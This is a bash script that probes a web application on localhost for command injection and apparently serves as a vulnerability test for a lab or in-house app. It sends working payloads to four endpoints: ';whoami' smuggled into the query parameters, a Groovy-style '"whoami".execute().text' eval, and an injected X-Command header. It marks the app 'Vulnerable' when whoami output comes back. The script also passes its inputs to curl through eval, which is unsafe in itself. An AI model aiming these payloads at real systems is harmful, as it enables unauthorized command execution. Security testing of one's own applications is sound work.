#!/bin/bash
# System command validation script

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}System Command Validation Script${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[Test $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(eval "curl -s $url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] Vulnerable${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] Test failed${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== Command Injection Tests ===${NC}"

test_case "Ping command" \
    "${BASE_URL}/api/v1/system/ping?host=8.8.8.8%3B+whoami" \
    "root|user|uid"

test_case "System exec" \
    "${BASE_URL}/api/v1/system/run?dir=%3Bwhoami" \
    "root|user|uid"

test_case "Script eval" \
    "'${BASE_URL}/api/v1/system/script/eval?cmd=%22whoami%22.execute().text'" \
    "root|user|uid"

test_case "Check endpoint" \
    "-H \"X-Command:;whoami\" ${BASE_URL}/api/v1/system/check" \
    "root|user|uid"

# Summary
echo -e "\n${BLUE}========================================${NC}"
echo "Total tests: ${YELLOW}$TOTAL${NC}"
echo "Passed: ${GREEN}$PASSED${NC}"
echo "Failed: ${RED}$FAILED${NC}"
